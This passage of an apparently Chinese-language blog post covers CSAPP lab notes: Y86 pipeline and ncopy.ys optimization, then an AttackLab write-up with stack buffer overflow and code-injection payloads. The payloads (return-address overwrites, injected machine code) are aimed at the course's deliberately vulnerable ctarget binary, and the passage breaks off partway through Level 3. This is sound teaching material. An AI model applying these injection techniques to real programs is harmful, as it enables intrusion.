&#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#39;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB &#x3D; [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#39;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后续按照实验手册测试步骤照做即可</p>
<h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p>最后部分稍难一些，需要对流水线有较好理解后自行优化硬件逻辑及汇编代码，尽可能高效地实现函数功能。先说下我对<code>pipe-full.hcl</code>文件的修改。首先是听从了实验手册的建议，实现了iaddq立即数加法指令，代码修改同Part B部分。因为函数含循环涉及大量条件跳转，考虑过将跳转预测逻辑修改为后向分支跳转，前向分支不跳转（见习题4.56），但稍加分析认为在本题中修改分支预测逻辑并无提升，遂延用默认预测逻辑</p>
<p>对于ncopy.ys代码的优化，首先是利用实现的iaddq将原本的诸如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">irmovq $1, %r10</span><br><span class="line">addq %r10, %rax</span><br></pre></td></tr></table></figure>

<p>两条指令合为一条</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iaddq $1, %r10</span><br></pre></td></tr></table></figure>

<p>其次注意到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	mrmovq (%rdi), %r10</span><br><span class="line">rmmovq %r10, (%rsi)</span><br><span class="line">andq %r10, %r10</span><br></pre></td></tr></table></figure>

<p>产生加载/使用冲突，浪费一个时钟周期，通过重排指令顺序将该周期利用起来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	mrmovq (%rdi), %r10</span><br><span class="line">andq %r10, %r10</span><br><span class="line">rmmovq %r10, (%rsi)</span><br></pre></td></tr></table></figure>

<p>再根据实验手册建议，参考第五章循环展开部分对CPE进行优化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line">	mrmovq 24(%rdi), %r13</span><br><span class="line">	andq %r10, %r10		# val &lt;&#x3D; 0?</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	jle Npos1		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos1:</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	jle Npos2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos2:</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	jle Npos3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos3:</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	rmmovq %r13, 24(%rsi)</span><br><span class="line">	jle Npos4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos4:</span><br><span class="line">	iaddq $32, %rdi		# src+&#x3D;4</span><br><span class="line">	iaddq $32, %rsi		# dst+&#x3D;4</span><br></pre></td></tr></table></figure>

<p>完整代码见下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;* $begin ncopy-ys *&#x2F;</span><br><span class="line">##################################################################</span><br><span class="line"># ncopy.ys - Copy a src block of len words to dst.</span><br><span class="line"># Return the number of positive words (&gt;0) contained in src.</span><br><span class="line">#</span><br><span class="line"># Include your name and ID here.</span><br><span class="line">#</span><br><span class="line"># Describe how and why you modified the baseline code.</span><br><span class="line">#</span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify this portion</span><br><span class="line"># Function prologue.</span><br><span class="line"># %rdi &#x3D; src, %rsi &#x3D; dst, %rdx &#x3D; len</span><br><span class="line">ncopy:</span><br><span class="line"></span><br><span class="line">##################################################################</span><br><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax, %rax		# count &#x3D; 0;</span><br><span class="line">	iaddq $-8, %rdx		# len -&#x3D; 8</span><br><span class="line">	andq %rdx, %rdx		# len &lt; 0?</span><br><span class="line">	jl Remain		# if so, goto Remain:</span><br><span class="line">	</span><br><span class="line">Loop:	</span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line">	mrmovq 24(%rdi), %r13</span><br><span class="line">	andq %r10, %r10		# val &lt;&#x3D; 0?</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	jle Npos1		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos1:</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	jle Npos2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos2:</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	jle Npos3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos3:</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	rmmovq %r13, 24(%rsi)</span><br><span class="line">	jle Npos4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos4:</span><br><span class="line">	iaddq $32, %rdi		# src+&#x3D;4</span><br><span class="line">	iaddq $32, %rsi		# dst+&#x3D;4</span><br><span class="line">	</span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line">	mrmovq 24(%rdi), %r13</span><br><span class="line">	andq %r10, %r10		# val &lt;&#x3D; 0?</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	jle Npos5		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos5:</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	jle Npos6</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos6:</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	jle Npos7</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos7:</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	rmmovq %r13, 24(%rsi)</span><br><span class="line">	jle Npos8</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos8:</span><br><span class="line">	iaddq $32, %rdi		# src+&#x3D;4</span><br><span class="line">	iaddq $32, %rsi		# dst+&#x3D;4</span><br><span class="line">	</span><br><span class="line">	iaddq $-8, %rdx		# len -&#x3D; 8</span><br><span class="line">	jge Loop			# if so, goto Loop:</span><br><span class="line">Remain:</span><br><span class="line">	iaddq $8, %rdx</span><br><span class="line">	je Done</span><br><span class="line">Final_loop:</span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	andq %r10, %r10		# val &lt;&#x3D; 0?</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	jle Npos9		# if so, goto Npos9:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos9:	</span><br><span class="line">	iaddq $8, %rdi		# src++</span><br><span class="line">	iaddq $8, %rsi		# dst++</span><br><span class="line">	iaddq $-1, %rdx		# len--</span><br><span class="line">	jg Final_loop</span><br><span class="line"></span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify the following section of code</span><br><span class="line"># Function epilogue.</span><br><span class="line">Done:</span><br><span class="line">	ret</span><br><span class="line">##################################################################</span><br><span class="line"># Keep the following label at the end of your function</span><br><span class="line">End:</span><br><span class="line">#&#x2F;* $end ncopy-ys *&#x2F;</span><br></pre></td></tr></table></figure>

<p>最终测试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> make psim VERSION=full</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./psim -t sdriver.yo</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./psim -t ldriver.yo</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./correctness.pl</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./benchmark.pl</span></span><br></pre></td></tr></table></figure>

<p>最终结果<code>Average CPE</code>为<code>8.70</code>，分数为<code>35.9</code>。满分需要<code>Average CPE</code>在7.50及以下，暂时先到这里，以后有机会再考虑继续优化，完成这个实验花费了大量时间与精力</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>第四章的学习对我来说是一个巨大的挑战。当初计组考前突击刷了几年的原题，背了一些高频考点，侥幸拿了个93分，实际的水平只有自己知道。甚至一直没有弄明白流水线条件跳转指令如果分支预测错了究竟是怎样消除错误取指的影响，回到正确的位置继续运行，对旁路预取也只有一个概念性的了解。学完第四章，豁然开朗，心中埋藏已久的疑惑终才解开。其实还是能感觉到没有把流水线吃得很透，做家庭作业时明显感到有些吃力，不过哪怕过程磕磕绊绊，终究还是收获满满，对底层硬件的原理有了更深刻的理解</p>
<p>由衷地向硬件设计者们表达我的敬意</p>
<h1 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><code>Phase 1</code>是一个简单直白的攻击，作为后续攻击的热身，只需照着说明手册上的提示一步步跟着做，即可将其破解</p>
<p>首先反汇编<code>touch1()</code>函数，获其地址为<code>0x4017c0</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure>

<p>接着反汇编<code>test()</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:		mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:		callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:	mov    %eax,%edx</span><br><span class="line">   0x0000000000401978 &lt;+16&gt;:	mov    $0x403188,%esi</span><br><span class="line">   0x000000000040197d &lt;+21&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x0000000000401982 &lt;+26&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401987 &lt;+31&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x000000000040198c &lt;+36&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000000000401990 &lt;+40&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>继续反汇编<code>getbuf()</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:		sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:		mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:		callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>由题意，需要通过栈溢出攻击，使得<code>getbuf()</code>函数调用retq语句返回目标地址从原本的<code>test()</code>函数体内转移至我们希望的<code>touch1()</code>函数。而<code>getbuf()</code>函数在栈上申请了40字节的缓冲区，反汇编<code>Gets()</code>函数后分析知它只是忠实地将用户输入字符串放置于缓冲区中，因此，只需先随意输入40个字符将缓冲区占满，再输入<code>touch1()</code>函数地址，修改<code>getbuf()</code>函数返回地址即可，因此，选择输入的文本如下</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">fez@</span>papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ cat ctarget1.txt </span><br><span class="line"><span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span></span><br><span class="line"><span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span></span><br><span class="line"><span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span></span><br><span class="line"><span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>需注意的是内存地址为64位八字节长，因此<code>touch1()</code>函数首地址<code>0x4017c0</code>应补齐为<code>0x004017c0</code>，再按小端顺序排列</p>
<p>测试结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target<span class="number">1</span>$ ./hex<span class="number">2</span>raw &lt; ctarget<span class="number">1</span>.txt | ./ctarget -q</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa</span><br><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">1</span>!: You called touch<span class="number">1</span>()</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">1</span> with target ctarget</span><br><span class="line"><span class="attribute">PASS</span>: Would have posted the following:</span><br><span class="line">	<span class="attribute">user</span> id	bovik</span><br><span class="line">	<span class="attribute">course</span>	<span class="number">15213</span>-f<span class="number">15</span></span><br><span class="line">	<span class="attribute">lab</span>	attacklab</span><br><span class="line">	<span class="attribute">result</span>	<span class="number">1</span>:PASS:<span class="number">0</span>xffffffff:ctarget:<span class="number">1</span>:<span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span> <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span> <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span> <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">10</span> C<span class="number">0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure>

<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><code>Phase 2</code>在前一题的基础上稍微提升了一点难度。我的<code>cookie</code>值为<code>0x59b997fa</code>，反汇编获得<code>touch2()</code>函数首地址为<code>0x4017ec</code>，我们的注入代码应实现的功能为</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 将cookie值写入%rdi寄存器</span><br><span class="line"><span class="number">2.</span> 调用touch2()函数</span><br></pre></td></tr></table></figure>

<p>得代码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">movq</span> $<span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa, %rdi</span><br><span class="line"><span class="attribute">pushq</span> $<span class="number">0</span>x<span class="number">4017</span>ec</span><br><span class="line"><span class="attribute">retq</span></span><br></pre></td></tr></table></figure>

<p>按说明文档步骤，通过<code>gcc -c tempfile.s</code>和<code>objdump tempfile.o &gt; tempfile.d</code>得对应机器码</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 fa <span class="number">97</span> b9 <span class="number">59</span></span><br><span class="line"><span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>

<p>通过gdb调试<code>ctarget</code>在<code>getbuf()</code>函数中打断点得输入字符串的首地址为<code>0x5561dc78</code>，故最终输入文本为</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span></span><br><span class="line"><span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          </span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target<span class="number">1</span>$ ./hex<span class="number">2</span>raw &lt; ctarget<span class="number">2</span>.txt | ./ctarget -q</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa</span><br><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">2</span>!: You called touch<span class="number">2</span>(<span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa)</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">2</span> with target ctarget</span><br><span class="line"><span class="attribute">PASS</span>: Would have posted the following:</span><br><span class="line">	<span class="attribute">user</span> id	bovik</span><br><span class="line">	<span class="attribute">course</span>	<span class="number">15213</span>-f<span class="number">15</span></span><br><span class="line">	<span class="attribute">lab</span>	attacklab</span><br><span class="line">	<span class="attribute">result</span>	<span class="number">1</span>:PASS:<span class="number">0</span>xffffffff:ctarget:<span class="number">2</span>:<span class="number">48</span> C<span class="number">7</span> C<span class="number">7</span> FA <span class="number">97</span> B<span class="number">9</span> <span class="number">59</span> <span class="number">68</span> EC <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> C<span class="number">3</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">78</span> DC <span class="number">61</span> <span class="number">55</span> </span><br></pre></td></tr></table></figure>

<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><code>Phase 3</code>需将值为<code>cookie</code>的字符串作为参数传递给<code>touch3()</code>函数，因<code>hexmatch()</code>函数内的指针<code>s</code>指向<code>cbuf</code>数组中的不确定位置，若按<code>Phase 2</code>中做法将注入代码与数据放于<code>getbuf()</code>函数申请的40个字节大小的缓存区内，则存在代码与数据被覆盖的可能。因此选择将注入代码与数据放于将要修改的<code>getbuf()</code>函数返回地址栈帧之上，即使用调用<code>getbuf()</code>函数的<code>test()</code>函数的栈帧来存储注入代码与数据，便可规避数据覆盖的风险</p>
<p>首先反汇编获得<code>touch3()</code>函数首地址为<code>0x4018fa</code>，我实验环境的<code>cookie</code>值为<code>0x59b997fa</code>，对应字符串为<code>35 39 62 39 39 37 66 61</code>，<code>getbuf()</code>函数返回地址存放在<code>0x5561dca0</code>处，则我们的代码应从<code>0x5561dca8</code>处开始，代码需要实现</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 将字符串首地址传递给%rdi</span><br><span class="line"><span class="number">2.</span> 调用touch3()函数</span><br></pre></td></tr></table></figure>

<p>得代码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">movq</span> 字符串首地址, %rdi		;<span class="number">48</span> c<span class="number">7</span> c<span class="number">7</span> xx xx xx xx</span><br><span class="line"><span class="attribute">pushq</span> $<span class="number">0</span>x<span class="number">4018</span>fa				;<span class="number">68</span> fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">retq</span>						;c<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">xx</span> xx xx xx为待计算出的字符串首地址</span><br></pre></td></tr></table></figure>

<p>选择将字符串数据放于注入代码之后，得输入文本</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5561dc78</span>:		<span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> 	;填充</span><br><span class="line"><span class="number">0x5561dc80</span>:		<span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> 	;填充</span><br><span class="line"><span class="number">0x5561dc88</span>:		<span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> 	;填充</span><br><span class="line"><span class="number">0x5561dc90</span>: 	<span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> 	;填充</span><br><span class="line"><span class="number">0x5561dc98</span>: 	<span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span>		;填充</span><br><span class="line"><span class="number">0x5561dca0</span>:		a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>		;返回地址</span><br><span class="line"><span class="number">0x5561dca8</span>:		<span class="number">48</span> c7 c7 xx xx xx xx <span class="number">68</span>		;代码</span><br><span class="line"><span class="number">0x5561dcb0</span>:		fa <span class="number">18</span> <span class="number">40</span> <span 